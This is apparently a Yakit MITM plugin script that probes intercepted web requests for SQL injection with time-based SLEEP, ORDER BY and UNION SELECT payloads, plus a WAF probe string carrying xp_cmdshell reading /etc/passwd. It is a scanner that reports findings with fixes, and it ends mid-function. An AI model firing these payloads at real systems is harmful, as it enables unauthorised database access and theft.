//WAFCheck = MITM_PARAMS["WAFCheck"] //Default is true
WAFCheck = true

SIMILARITY_RATIO = 0.999
LOWER_RATIO_BOUND = 0.02
UPPER_RATIO_BOUND = 0.98
DIFF_TOLERANCE = 0.05

CLOSE_TYPE = {0: `'`, 1: `"`, 2: ``, 3: `')`, 4: `")`,5:`%'`,6:`%"`,7:`%')`,8:`%")`}

//const
FORMAT_EXCEPTION_STRINGS = ["Type mismatch", "Error converting", "Please enter a", "Conversion failed", "String or binary data would be truncated", "Failed to convert", "unable to interpret text value", "Input string was not in a correct format", "System.FormatException", "java.lang.NumberFormatException", "ValueError: invalid literal", "TypeMismatchException", "CF_SQL_INTEGER", "CF_SQL_NUMERIC", " for CFSQLTYPE ", "cfqueryparam cfsqltype", "InvalidParamTypeException", "Invalid parameter type", "Attribute validation error for tag", "is not of type numeric", "<cfif Not IsNumeric(", "invalid input syntax for integer", "invalid input syntax for type", "invalid number", "character to number conversion error", "unable to interpret text value", "String was not recognized as a valid", "Convert.ToInt", "cannot be converted to a ", "InvalidDataException", "Arguments are of the wrong type"]
#--------------------------WORKSPACE-----------------------------
# Alphabet used for heuristic checks
HEURISTIC_CHECK_ALPHABET = [`"`, `'`, `)`, `(`, `,`, `.`]

DBMS_ERRORS = {"MySQL": [`SQL syntax.*MySQL`, `Warning.*mysql_.*`, `valid MySQL result`, `MySqlClient\.`], "PostgreSQL": [`PostgreSQL.*ERROR`, `Warning.*\Wpg_.*`, `valid PostgreSQL result`, `Npgsql\.`], "Microsoft SQL Server": [`Driver.* SQL[\-\_\ ]*Server`, `OLE DB.* SQL Server`, `(\W|\A)SQL Server.*Driver`, `Warning.*mssql_.*`, `(\W|\A)SQL Server.*[0-9a-fA-F]{8}`, `(?s)Exception.*\WSystem\.Data\.SqlClient\.`, `(?s)Exception.*\WRoadhouse\.Cms\.`], "Microsoft Access": [`Microsoft Access Driver`, `JET Database Engine`, `Access Database Engine`], "Oracle": [`\bORA-[0-9][0-9][0-9][0-9]`, `Oracle error`, `Oracle.*Driver`, `Warning.*\Woci_.*`, `Warning.*\Wora_.*`], "IBM DB2": [`CLI Driver.*DB2`, `DB2 SQL error`, `\bdb2_\w+\(`], "SQLite": [`SQLite/JDBCDriver`, `SQLite.Exception`, `System.Data.SQLite.SQLiteException`, `Warning.*sqlite_.*`, `Warning.*SQLite3::`, `\[SQLITE_ERROR\]`], "Sybase": [`(?i)Warning.*sybase.*`, `Sybase message`, `Sybase.*Server message.*`]}

isJavaScript = rsp => {
    if poc.GetHTTPPacketContentType(rsp).Contains("javascript") {
        return true
    }
    return false
}

# mirrorFilteredHTTPFlow hijacked traffic Possibility of automatic filtering for MITM and "Business" related traffic will be automatically filtered out js / css equal flow
mirrorFilteredHTTPFlow = func(isHttps /* bool */, url /* string */, req /* []byte */, rsp /* []byte */, body /* []byte */) {
    if isJavaScript(rsp) { return }
    pipeLine(isHttps, url, req, rsp, body)//Open an independent coroutine for each request. The
}

func pipeLine(isHttps /* bool */, url /* string */, req /* []byte */, rsp /* []byte */, body /* []byte */) {
    TEMPLATE_PAGE_RSP = rsp//. Subsequent calculation of pageratio is the normal request page    //. Subsequent calculation of pageratio is the normal request page
    if preCheck(isHttps, req, TEMPLATE_PAGE_RSP) == -1 {//Do some pre-checks to avoid meaningless subsequent detection
        return
    }
    wafAnalyse(req, rsp, TEMPLATE_PAGE_RSP, isHttps)//Determine whether waf exists in the backend. It will only be judged as a prompt message and no further action will be taken. If injection is detected, additional information may be considered.
    heuristicCheckIfInjectable(url, req, isHttps, TEMPLATE_PAGE_RSP)//Start heuristic SQL injection detection
}

func preCheck(isHttps /* bool */, req, rsp /* []byte */) {
    header, _ := str.SplitHTTPHeadersAndBodyFromPacket(rsp)
    if re.Match(`HTTP\/.\.. 404`, header) {
        yakit_output("The original requested resource is not")
        return -1
    }


    freq, err := fuzz.HTTPRequest(req, fuzz.https(isHttps))
    if err != nil {
        yakit_output("precheck failed to build fuzz parsing" + parseString(err))
        return -1
    }

    CommonParams := freq.GetCommonParams()

    if len(CommonParams) == 0 {
        yakit_output("No parameters can be injected")
        return -1
    }
    return 0

}

func wafAnalyse(req /* []byte */, rsp /* []byte */, original /* []byte */, isHttps /* bool */) {
    freq, _ := fuzz.HTTPRequest(req, fuzz.https(isHttps))

    flag = false
    if WAFCheck {
        IPS_WAF_CHECK_RATIO := 0.5
        for _, param := range freq.GetCommonParams() {
            IPS_WAF_CHECK_PAYLOAD := parseStr(param.Value()[0]) + " AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\"XSS\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')-- "
            testResp, err := param.Fuzz(IPS_WAF_CHECK_PAYLOAD).ExecFirst(fuzz.WithNamingContext("sql"),
                                                                         fuzz.WithConcurrentLimit(1))
            if err != nil {
                yakit_output("waf detection request error:" + parseString(err))
                return
            }


            result := str.CalcSimilarity(original, testResp.ResponseRaw)
            if result < IPS_WAF_CHECK_RATIO {
                flag = true
                break
            }

        }


        if flag {
            yakit_output("Heuristic WAF detection: WAF")
            return
        } else {
            yakit_output(sprintf("Heuristic WAF detection: WAF"))
            return
        }

    }

}

/*
 + first filter out the valid parameters, that is, there is no transformed parameter
 + Try and determine SQL injection in sequence
*/
func heuristicCheckIfInjectable(url /* string */, req /* []byte */, isHttps /* bool */, TEMPLATE_PAGE_RSP /* []byte */) {
    freq, err := fuzz.HTTPRequest(req, fuzz.https(isHttps))
    if err != nil {
        yakit_output("checkIfInjectable build fuzz parsing failed" + parseString(err))
        return
    }


    templateRsp, err := freq.ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    var body
    body = string(templateRsp.ResponseRaw)

    if err != nil || templateRsp.Error != nil {
        yakit_output("checkIfInjectable Fuzz request error")
        die(err)
    }


    for _, value := range FORMAT_EXCEPTION_STRINGS {
        if str.Contains(body, value) {
            yakit_output("template request parameters. Please provide normal request parameters.")//Same as sqlmap
            die("template request parameters. Please provide normal request parameters.")
        }

    }


    injectableParamsPos := []//Avoid parameter duplication in POST requests and record parameter locations
    reqMethod = freq.GetMethod()
    if reqMethod != "GET" && reqMethod != "POST" {
        yakit_output("request method does not yet support detection of")
        die("request method does not yet support detection of")
    }


    randomTestString := getErrorBasedPreCheckPayload()
    randString = randstr(4)
    cast := false

    CommonParams := freq.GetCommonParams()
    yakit_output(str.f("Total test parameters %v", len(CommonParams)))

    for pos, param := range CommonParams {
        var rsp, err
        if str.MatchAllOfRegexp(parseStr(param.Value()[0]), `^[0-9]+$`) {
            rsp, err = param.Fuzz(randomTestString + randString).ExecFirst(fuzz.WithNamingContext("sql"),
                                                                           fuzz.WithConcurrentLimit(1))
            time.Sleep(0.5)
        } else {
            rsp, err = param.Fuzz(randomTestString + parseStr(randn(1, 9999))).ExecFirst(fuzz.WithNamingContext("sql"),
                                                                                         fuzz.WithConcurrentLimit(1))
            time.Sleep(0.5)
        }


        if err != nil {
            yakit_output("checkIfInjectable Fuzz request error")
            die(err)
        }


        _, body := str.SplitHTTPHeadersAndBodyFromPacket(rsp.ResponseRaw)

        body = string(body)

        var cast

        for _, value := range FORMAT_EXCEPTION_STRINGS {
            if str.Contains(body, value) {
                cast = true
                yakit_output(reqMethod + "Parameters: " + param.Name() + " Unable to inject")
                break
            }

        }


        if cast {
            cast = false
            continue
        }


        injectableParamsPos = append(injectableParamsPos, pos)
        yakit_output(reqMethod + "Parameters: " + param.Name() + " Try time injection")
    }


    if len(injectableParamsPos) == 0 {
        yakit_output("No injection parameter")
        return
    }


    if len(CommonParams) != len(injectableParamsPos) {
        cast = true//indicates that some parameters have transformation
    }


    for _, pos := range injectableParamsPos {
        checkSqlInjection(pos, req, cast, TEMPLATE_PAGE_RSP, CommonParams, isHttps)
    }

}

func checkSqlInjection(pos /* int */, req /* []byte */, castDetected /* bool */, TEMPLATE_PAGE_RSP /* []byte */, CommonParams /* []*mutate.FuzzHTTPRequestParam */, isHttps) {
    checkErrorBased(pos, req, castDetected, CommonParams, isHttps)
    closeType, lineBreak := checkCloseType(pos, req, CommonParams, isHttps)
    if closeType == -1 {
        for index, param := range CommonParams {
            if index == pos {
                yakit_output("parameter: %v. Closed boundary", param.Name())
                return//check next not casted param
                //check next not casted param
            }

        }

    }


    checkTimeBasedBlind(pos, req, CommonParams, closeType, lineBreak, isHttps)
    //checkBoolBased(pos, freq) //TODO:bool based
    checkUnionBased(pos, req, TEMPLATE_PAGE_RSP, CommonParams, closeType, lineBreak, isHttps)
    //checkStackedInjection
}

func checkErrorBased(pos /* int */, req /* []byte */, castDetected /* bool */, CommonParams /* []*mutate.FuzzHTTPRequestParam */, isHttps /* bool */) {
    freq, _ := fuzz.HTTPRequest(req, fuzz.https(isHttps))
    if castDetected {
        paramName := ""
        for index, param := range CommonParams {
            if index == pos {
                paramName = param.Name()
                payload := parseStr(param.Value()[0]) + getErrorBasedPreCheckPayload()
                result, err = param.Fuzz(payload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
                if err != nil {
                    yakit_output("Attempt to detect Error-Based SQL Injection Payload failed")
                    return
                }


                for DBMS, regexps = range DBMS_ERRORS {
                    if str.MatchAnyOfRegexp(result.ResponseRaw, regexps...) {
                        yakit_output("Confirm backend Database error")
                        codecPayload = string(payload)
                        risk.NewRisk(
                            result.Url,
                            risk.severity("critical"),
                            risk.description("Based on error (Error- SQL injection based on SQL injection is a common attack technique. Attackers use the error information returned by the application to infer and obtain sensitive information of the database. It exploits error conditions that can occur when an application processes SQL queries, revealing details about the database structure, data content, and other sensitive information."),
                            risk.solution("uses parameterized query and ORM (object relational mapping) framework for input verification and filtering. The code follows the principle of least privilege"),
                            risk.title(str.f(
                                "ERROR-Based SQL Injection: [%v:%v] Guess DBMS: %v",
                                param.Name(),
                                param.Value(),
                                DBMS,
                            )),
                            risk.titleVerbose(str.f(
                                ". There may be error-based SQL injection: [Parameter name: %v Original value: %v] Guess database type: %v",
                                param.Name(),
                                param.Value(),
                                DBMS,
                            )),
                            risk.type("sqlinjection"),
                            risk.request(result.RequestRaw),
                            risk.response(result.ResponseRaw),
                            risk.payload(payload),
                            risk.parameter(param.Name()),
                        )//Consider adding some detection payloads such as extractvalue or updatexml. This way you can confirm that you can indeed use the error reporting point to inject
                        yakit_output("Parameters: " + paramName + "There is an error injection")
                        return
                    }

                }


                yakit_output("Parameters: " + paramName + " There is no error injection")
            }

        }


        for index, param := range CommonParams {
            if index == pos {
                paramName = param.Name()
                var payload
                if str.MatchAllOfRegexp(parseStr(param.Value()[0]), `^[0-9]+$`) {
                    payload = randstr(4) + getErrorBasedPreCheckPayload()
                } else {
                    payload = parseStr(randn(99999, 9999999)) + getErrorBasedPreCheckPayload()
                }


                result, err = param.Fuzz(payload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
                if err != nil {
                    yakit_output("Attempt to detect Error-Based SQL Injection Payload failed")
                    return
                }


                for DBMS, regexps = range DBMS_ERRORS {
                    if str.MatchAnyOfRegexp(result.ResponseRaw, regexps...) {
                        yakit_output("Confirm backend Database error")
                        codecPayload = string(payload)
                        risk.NewRisk(
                            result.Url,
                            risk.severity("critical"),
                            risk.description("Based on error (Error- SQL injection based on SQL injection is a common attack technique. Attackers use the error information returned by the application to infer and obtain sensitive information of the database. It exploits error conditions that can occur when an application processes SQL queries, revealing details about the database structure, data content, and other sensitive information."),
                            risk.solution("uses parameterized query and ORM (object relational mapping) framework for input verification and filtering. The code follows the principle of least privilege"),
                            risk.title(str.f(
                                "ERROR-Based SQL Injection: [%v:%v] Guess DBMS: %v",
                                param.Name(),
                                param.Value(),
                                DBMS,
                            )),
                            risk.titleVerbose(str.f(
                                ". There may be error-based SQL injection: [Parameter name: %v Original value: %v] Guess database type: %v",
                                param.Name(),
                                param.Value(),
                                DBMS,
                            )),
                            risk.type("sqlinjection"),
                            risk.request(result.RequestRaw),
                            risk.response(result.ResponseRaw),
                            risk.payload(payload),
                            risk.parameter(param.Name()),
                        )//Consider adding some detection payloads such as extractvalue or updatexml. This way you can confirm that you can indeed use the error reporting point to inject
                        yakit_output("Parameters: " + paramName + "There is an error injection")
                        return
                    }

                }


                yakit_output("Parameters: " + paramName + " There is no error injection")
            }

        }

    } else {
        paramName := ""
        for index, param := range CommonParams {
            if index == pos {
                paramName = param.Name()
                payload := parseStr(param.Value()[0]) + getErrorBasedPreCheckPayload()
                result, err = param.Fuzz(payload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
                if err != nil {
                    yakit_output("Attempt to detect Error-Based SQL Injection Payload failed")
                    return
                }


                for DBMS, regexps = range DBMS_ERRORS {
                    if str.MatchAnyOfRegexp(result.ResponseRaw, regexps...) {
                        yakit_output("Confirm backend Database error")
                        codecPayload = string(payload)
                        //addVul()
                        risk.NewRisk(
                            result.Url,
                            risk.severity("critical"),
                            risk.title(str.f(
                                "ERROR-Based SQL Injection: [%v:%v] Guess DBMS: %v",
                                param.Name(),
                                param.Value(),
                                DBMS,
                            )),
                            risk.titleVerbose(str.f(
                                ". There may be error-based SQL injection: [Parameter name: %v Original value: %v] Guess database type: %v",
                                param.Name(),
                                param.Value(),
                                DBMS,
                            )),
                            risk.description("Based on error (Error- SQL injection based on SQL injection is a common attack technique. Attackers use the error information returned by the application to infer and obtain sensitive information of the database. It exploits error conditions that can occur when an application processes SQL queries, revealing details about the database structure, data content, and other sensitive information."),
                            risk.solution("uses parameterized query and ORM (object relational mapping) framework for input verification and filtering. The code follows the principle of least privilege"),
                            risk.type("sqlinjection"),
                            risk.request(result.RequestRaw),
                            risk.response(result.ResponseRaw),
                            risk.payload(payload),
                            risk.parameter(param.Name()),
                        )//Consider adding some detection payloads such as extractvalue or updatexml. This way you can confirm that you can indeed use the error reporting point to inject
                        return
                    }

                }


                yakit_output("Parameters: " + paramName + "There is no error injection")
            }

        }

    }

}

func checkCloseType(pos /* int */, req /* []byte */, CommonParams /* []*mutate.FuzzHTTPRequestParam */, isHttps /* bool */) {
    freq, _ := fuzz.HTTPRequest(req, fuzz.https(isHttps))
    yakit_output(parseStr(isHttps))
    originResult, err = freq.ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    if err != nil {
        yakit_output(err)
        return -1, false
    }


    for index, param := range CommonParams {
        if index == pos {
            numeric := str.MatchAllOfRegexp(parseStr(param.Value()[0]), `^[0-9]+$`)
            if numeric {
                closeType := checkParam(param, parseStr(param.Value()[0]), originResult, numeric)
                if closeType == -1 {
                    closeType = checkParam(param, parseStr(param.Value()[0]) + "\n", originResult, numeric)
                    if closeType == -1 {
                        return -1, false//detects the next parameter

                    } else {
                        return closeType, true
                    }

                } else {
                    return closeType, false
                }

            } else {
                closeType := checkParam(param, parseStr(param.Value()[0]), originResult, numeric)
                if closeType == -1 {
                    closeType = checkParam(param, parseStr(param.Value()[0]) + "\n", originResult, numeric)
                    if closeType == -1 {
                        return -1, false
                    } else {
                        return closeType, true
                    }

                } else {
                    return closeType, false
                }

            }

        }

    }

}

func checkTimeBasedBlind(pos /* int */, req /* []byte */, CommonParams /* []*mutate.FuzzHTTPRequestParam */, closeType /* int */, lineBreak /* bool */, isHttps /* bool */) {
    var payload, payload1
    freq, _ := fuzz.HTTPRequest(req, fuzz.https(isHttps))

    err, standardRespTime := getNormalRespondTime(req, isHttps)
    if err != nil {
        yakit_output(parseStr(err))//No more testing time blind injection due to error in obtaining response time
        return
    }


    yakit_output("The normal response time of the website should be less than:" + parseStr(standardRespTime) + "ms")
    if lineBreak {
        payload = sprintf(`%v/**/And/**/SleeP(%v)-- `, ("\n" + CLOSE_TYPE[closeType]), standardRespTime * 2 / 1000 + 3)
        payload1 = sprintf(`%v/**/And/**/SleeP(%v)#`, ("\n" + CLOSE_TYPE[closeType]), standardRespTime * 2 / 1000 + 3)
    } else {
        payload = sprintf(`%v/**/And/**/SleeP(%v)-- `, CLOSE_TYPE[closeType], standardRespTime * 2 / 1000 + 3)
        payload1 = sprintf(`%v/**/And/**/SleeP(%v)#`, CLOSE_TYPE[closeType], standardRespTime * 2 / 1000 + 3)
    }


    for index, param := range CommonParams {
        if index == pos {
            yakit_output("Try time injection")
            payload = parseStr(param.Value()[0]) + payload
            payload1 = parseStr(param.Value()[0]) + payload1
            result, err = param.Fuzz(payload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1),
                                                        fuzz.WithTimeOut(30))
            if err != nil {
                yakit_output("attempts to detect Time-Based Blind SQL Injection Payload and fails")
                return
            }
            result1, err = param.Fuzz(payload1).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1),
                                                              fuzz.WithTimeOut(30))
            if err != nil {
                yakit_output("attempts to detect Time-Based Blind SQL Injection Payload and fails")
                return
            }

            yakit_output(sprintf("The websites response time to payload is %v", result.ServerDurationMs))
            yakit_output(sprintf("The websites response time to payload1 is %v", result1.ServerDurationMs))
            if result.ServerDurationMs <= standardRespTime + 2000 && result1.ServerDurationMs > standardRespTime + 2000{
                result = result1
            }
            if result.ServerDurationMs > standardRespTime + 2000 {
                yakit_output(str.f(
                    "There is no injection parameter",
                    param.Name(),
                    param.Value(),
                ))
                codecPayload = string(payload)
                risk.NewRisk(
                    result.Url,
                    risk.severity("critical"),
                    risk.title(str.f(
                        "Time-Based Blind SQL Injection: [%v:%v]",
                        param.Name(),
                        param.Value(),
                    )),
                    risk.titleVerbose(str.f(
                        ": [Parameter name: %v Value: %v]",
                        param.Name(),
                        param.Value(),
                    )),
                    risk.description("Time-Based Blind SQL injection is a SQL injection attack technique that exploits delayed response time. Unlike conventional error messages or output differences, Time-Based Blind SQL The injection takes advantage of the delayed response an application may have when processing malicious input. An attacker can determine whether malicious SQL code has been successfully injected by observing the applications response time, and further obtain sensitive information."),
                    risk.solution("uses parameterized query and ORM (object relational mapping) framework for input verification and filtering. The code follows the principle of least privilege"),
                    risk.type("sqlinjection"),
                    risk.request(result.RequestRaw),
                    risk.response(result.ResponseRaw),
                    risk.payload(payload),
                    risk.parameter(param.Name()),
                )
                return
            } else {
                yakit_output("TimeBased time blind injection is not detected")
                return
            }

        }

    }

}

func checkBoolBased(pos /* int */, freq /* fuzzhttp */) {  }

func checkUnionBased(pos /* int */, req /* []byte */, TEMPLATE_PAGE_RSP /* []byte */, CommonParams /* []*mutate.FuzzHTTPRequestParam */, closeType /* int */, lineBreak /* bool */, isHttps /* bool */) {
    if guessColumnNum(pos, req, TEMPLATE_PAGE_RSP, CommonParams, closeType, lineBreak, isHttps) != -1 {
        return
    }


    if bruteColumnNum(pos, req, TEMPLATE_PAGE_RSP, CommonParams, closeType, lineBreak, isHttps) != -1 {
        return
    }


    yakit_output("UNION joint injection not detected")
}

func guessColumnNum(pos /* int */, req /* []byte */, TEMPLATE_PAGE_RSP /* []byte */, CommonParams /* []*mutate.FuzzHTTPRequestParam */, closeType /* int */, lineBreak /* bool */, isHttps /* bool */) {
    var payload, result, columnNum
    freq, _ := fuzz.HTTPRequest(req, fuzz.https(isHttps))
    ORDER_BY_STEP := 10
    ORDER_BY_MAX := 100
    lowCols, highCols = 1, ORDER_BY_STEP
    found = false
    DEFAULT_RATIO := -1

    condition_1, DEFAULT_RATIO, _ = orderByTest(1, pos, req, TEMPLATE_PAGE_RSP, DEFAULT_RATIO, CommonParams, closeType, lineBreak, isHttps)
    condition_2, DEFAULT_RATIO, _ = orderByTest(randn(9999, 999999), pos, req, TEMPLATE_PAGE_RSP, DEFAULT_RATIO,CommonParams, closeType, lineBreak, isHttps)

    if condition_1 && !condition_2 {
        for !found{
            condition_volatile, DEFAULT_RATIO, _ = orderByTest(highCols, pos, req, TEMPLATE_PAGE_RSP, DEFAULT_RATIO,CommonParams, closeType, lineBreak, isHttps)
            if condition_volatile {
                lowCols = highCols
                highCols += ORDER_BY_STEP

                if highCols > ORDER_BY_MAX {
                    break
                }

            } else {
                for !found{
                    mid = highCols - math.Round((highCols - lowCols) / 2)
                    condition_volatile_sec, DEFAULT_RATIO, result = orderByTest(mid, pos, req, TEMPLATE_PAGE_RSP, DEFAULT_RATIO, CommonParams, closeType, lineBreak, isHttps)
                    if condition_volatile_sec {
                        lowCols = mid
                    } else {
                        highCols = mid
                    }


                    if (highCols - lowCols) < 2 {
                        columnNum = lowCols
                        found = true
                    }

                }


                for index, param := range CommonParams {
                    if index == pos {
                        if lineBreak {
                            payload = parseStr(param.Value()[0]) + "\n" + CLOSE_TYPE[closeType] + `/**/ORDeR/**/bY/**/` + parseStr(columnNum) + "-- "
                        } else {
                            payload = parseStr(param.Value()[0]) + CLOSE_TYPE[closeType] + `/**/ORDeR/**/bY/**/` + parseStr(columnNum) + "-- "
                        }
                        rspRisk, err := param.Fuzz(payload).ExecFirst(fuzz.WithNamingContext("sql"),fuzz.WithConcurrentLimit(1))
                        if err == nil{
                            risk.NewRisk(result.Url, risk.severity("critical"),
                            risk.title(str.f("Union-Based SQL Injection: [%v:%v]", param.Name(), param.Value())),
                            risk.titleVerbose(str.f(
                                "exists based on UNION SQL injection: [Parameter name: %v Value: %v]",
                                param.Name(),
                                param.Value(),
                            )),
                            risk.description("Union-Based SQL injection is a common SQL injection attack technology, by using the UNION operation in the query statement of the application operator to obtain sensitive information in the database. Attackers use the UNION operator to merge malicious SELECT queries with normal query results, thereby leaking database data."),
                            risk.solution("uses parameterized query and ORM (object relational mapping) framework for input verification and filtering. The code follows the principle of least privilege"),
                            risk.type("sqlinjection"),
                            risk.payload(payload),
                            risk.parameter(param.Name()),
                            risk.request(param.Fuzz(payload).FirstHTTPRequestBytes()),
                            risk.response(rspRisk.ResponseRaw)
                        )
                        }else{
                              risk.NewRisk(
                            result.Url,
                            risk.severity("critical"),
                            risk.title(str.f("Union-Based SQL Injection: [%v:%v]", param.Name(), param.Value())),
                            risk.titleVerbose(str.f(
                                "exists based on UNION SQL injection: [Parameter name: %v Value: %v]",
                                param.Name(),
                                param.Value(),
                            )),
                            risk.description("Union-Based SQL injection is a common SQL injection attack technology, by using the UNION operation in the query statement of the application operator to obtain sensitive information in the database. Attackers use the UNION operator to merge malicious SELECT queries with normal query results, thereby leaking database data."),
                            risk.solution("uses parameterized query and ORM (object relational mapping) framework for input verification and filtering. The code follows the principle of least privilege"),
                            risk.type("sqlinjection"),
                            risk.payload(payload),
                            risk.parameter(param.Name()),
                            risk.request(param.Fuzz(payload).FirstHTTPRequestBytes())
                        )
                        }


                        yakit_output(str.f(
                            "There is injection based on UNION SQL: [Parameter name: %v Original value: %v]",
                            param.Name(),
                            param.Value()[0],
                        ))
                        yakit_output(str.f("UNION The column number is detected as" + parseStr(columnNum)))
                    }

                }

            }


            return columnNum
        }

    }


    return -1
}

func orderByTest(number /* int */, pos /* int */, req /* []byte */, TEMPLATE_PAGE_RSP /* []byte */, DEFAULT_RATIO /* float */, CommonParams /* []*mutate.FuzzHTTPRequestParam */, closeType /* int */, lineBreak /* bool */, isHttps/* bool */) {
    var payload
    freq, _ := fuzz.HTTPRequest(req, fuzz.https(isHttps))
    for index, param := range CommonParams {
        if index == pos {
            if lineBreak {
                payload = parseStr(param.Value()[0]) + "\n" + CLOSE_TYPE[closeType] + `/**/ORDeR/**/bY/**/` + parseStr(number) + "-- "
            } else {
                payload = parseStr(param.Value()[0]) + CLOSE_TYPE[closeType] + `/**/ORDeR/**/bY/**/` + parseStr(number) + "-- "
            }


            result, err = param.Fuzz(payload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
            if err != nil {
                yakit_output("Try to detect Order by failed")
                return false, 0 , nil
            }


            condition, DEFAULT_RATIO = comparison(result, TEMPLATE_PAGE_RSP, DEFAULT_RATIO)
            return !str.MatchAnyOfRegexp(
                result.ResponseRaw,
                ["(warning|error):", "order (by|clause)", "unknown column", "failed"]...,
            ) && condition || str.MatchAnyOfRegexp(
                result.ResponseRaw,
                "data types cannot be compared or sorted",
            ), DEFAULT_RATIO, result
        }

    }

}

func comparison(result /* fuzzhttp */, TEMPLATE_PAGE_RSP /* []byte */, DEFAULT_RATIO) {
    codeResult := result.Response.StatusCode
    TEMPLATE_RSP, err := str.ParseStringToHTTPResponse(TEMPLATE_PAGE_RSP)
    _, TEMPLATE_BODY := str.SplitHTTPHeadersAndBodyFromPacket(TEMPLATE_PAGE_RSP)
    _, resultBody := str.SplitHTTPHeadersAndBodyFromPacket(result.ResponseRaw)
    if err != nil {
        panic(err)// malformed response package
    }


    TEMPLATE_CODE := TEMPLATE_RSP.StatusCode
    if codeResult == TEMPLATE_CODE {
        ratio := str.CalcSimilarity(resultBody, TEMPLATE_BODY)
        if DEFAULT_RATIO == -1 {
            if ratio >= LOWER_RATIO_BOUND && ratio <= UPPER_RATIO_BOUND {
                DEFAULT_RATIO = ratio
            }

        }


        if ratio > UPPER_RATIO_BOUND {
            return true, DEFAULT_RATIO
        } elif ratio < LOWER_RATIO_BOUND {
            return false, DEFAULT_RATIO
        } else {
            return (ratio - DEFAULT_RATIO) > DIFF_TOLERANCE, DEFAULT_RATIO
        }

    }


    return false, DEFAULT_RATIO
}

func bruteColumnNum(pos /* int */, req /* []byte */, TEMPLATE_PAGE_RSP /* []byte */, CommonParams /* []*mutate.FuzzHTTPRequestParam */, closeType /* int */, lineBreak /* bool */, isHttps /* bool */) {
    var payload
    /* UPPER_COUNT - LOWER_COUNT *MUST* >= 5 */
    LOWER_COUNT = 1
    UPPER_COUNT = 15

    err, standardRespTime := getNormalRespondTime(req, isHttps)
    if err != nil {
        yakit_output(parseStr(err))
        return
    }


    freq, _ := fuzz.HTTPRequest(req, fuzz.https(isHttps))

    md5Randstr = randstr(5)
    md5CheckVal := codec.Md5(md5Randstr)
    randStr := `md5('` + md5Randstr + `')` + ","

    TEMPLATE_RSP, err := str.ParseStringToHTTPResponse(TEMPLATE_PAGE_RSP)
    _, TEMPLATE_BODY := str.SplitHTTPHeadersAndBodyFromPacket(TEMPLATE_PAGE_RSP)

    if err != nil {
        panic(err)// malformed response package
     }


    ratios := make(map[int]float, 0)
    var ratio

    for index, param := range CommonParams {
        if index == pos {
            for i := LOWER_COUNT; i <= UPPER_COUNT; i++ {
                if lineBreak {
                    payload = parseStr(param.Value()[0]) + "\n" + CLOSE_TYPE[closeType] + `/**/UniOn/**/All/**/Select/**/` + str.Repeat(
                                                                                                                                        "NULL,",
                                                                                                                                        i - 1) + randStr
                } else {
                    payload = parseStr(param.Value()[0]) + CLOSE_TYPE[closeType] + `/**/UniOn/**/All/**/Select/**/` + str.Repeat(
                                                                                                                                 "NULL,",
                                                                                                                                 i - 1) + randStr
                }


                payload = str.TrimRight(payload, ",") + "-- abc"
                result, err := param.Fuzz(payload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
                if err != nil {
                    yakit_output("Try to detect Union SQL Injection Payload failed")
                    return
                }


                _, resultBody := str.SplitHTTPHeadersAndBodyFromPacket(result.ResponseRaw)

                if resultBody.Contains(md5CheckVal) {
                    yakit_output(str.f(
                        "exists UNION SQL injection: [Parameter name: %v original value: %v]",
                        param.Name(),
                        param.Value(),
                    ))
                    risk.NewRisk(
                        result.Url,
                        risk.severity("critical"),
                        risk.title(str.f("UNION SQL Injection: [%v:%v]", param.Name(), param.Value())),
                        risk.titleVerbose(str.f(
                            "There is UNION SQL injection: [Parameter name: %v Value: %v]",
                            param.Name(),
                            param.Value(),
                        )),
                        risk.description("Union-Based SQL injection is a common SQL injection attack technology, by using the UNION operation in the query statement of the application operator to obtain sensitive information in the database. Attackers use the UNION operator to merge malicious SELECT queries with normal query results, thereby leaking database data."),
                        risk.solution("uses parameterized query and ORM (object relational mapping) framework for input verification and filtering. The code follows the principle of least privilege"),
                        risk.type("sqlinjection"),
                        risk.request(result.RequestRaw),
                        risk.response(result.ResponseRaw),
                        risk.payload(payload),
                        risk.parameter(param.Name()),
                    )
                    yakit_output(str.f(
                        "There is injection based on UNION SQL: [Parameter name: %v Original value: %v]",
                        param.Name(),
                        param.Value(),
                    ))
                    yakit_output(str.f("UNION column number detected by UNION BruteForce ratio is" + parseInt(i)))
                    return parseInt(i)
                }


                ratio = str.CalcSimilarity(resultBody, TEMPLATE_BODY)
                ratios[i - 1] = ratio
                //yakit_output(parseStr(ratio))
                time.Sleep(0.3)// Avoid result deviation caused by too frequent requests resulting in rate limitation
                continue
            }

        }

    }


    lowest = 1.0
    highest = 0.0
    lowest_count = 0
    highest_count = 0
    distinguish = -1

    for _, value := range ratios {
        if value > highest {
            highest = value
        }


        if value < lowest {
            lowest = value
        }

    }


    middle = make([]float)
    for index, value := range ratios {
        if value != highest && value != lowest {
            middle.Append(value)
            continue
        }


        if value == lowest {
            lowest_count = lowest_count + 1
        }


        if value == highest {
            highest_count = highest_count + 1
        }

    }


    if len(middle) == 0 && highest != lowest {
        if highest_count == 1 {
            distinguish = highest
        } elif lowest_count == 1 {
            distinguish = lowest
        }

    }


    if distinguish != -1 {
        var columnNum = ""

        for index, value := range ratios {
            if value == distinguish {
                columnNum = parseStr(index + 1)
            }

        }


        md5Randstr = randstr(5)
        for index, param := range CommonParams {
            if index == pos {
                if lineBreak {
                    payload = parseStr(param.Value()[0]) + "\n" + CLOSE_TYPE[closeType] + `/**/UniOn/**/All/**/Select/**/` + str.Repeat(
                                                                                                                                        str.f(
                                                                                                                                              `md5('%v'),`,
                                                                                                                                              md5Randstr),
                                                                                                                                        parseInt(columnNum))
                } else {
                    payload = parseStr(param.Value()[0]) + CLOSE_TYPE[closeType] + `/**/UniOn/**/All/**/Select/**/` + str.Repeat(
                                                                                                                                 str.f(
                                                                                                                                       `md5('%v'),`,
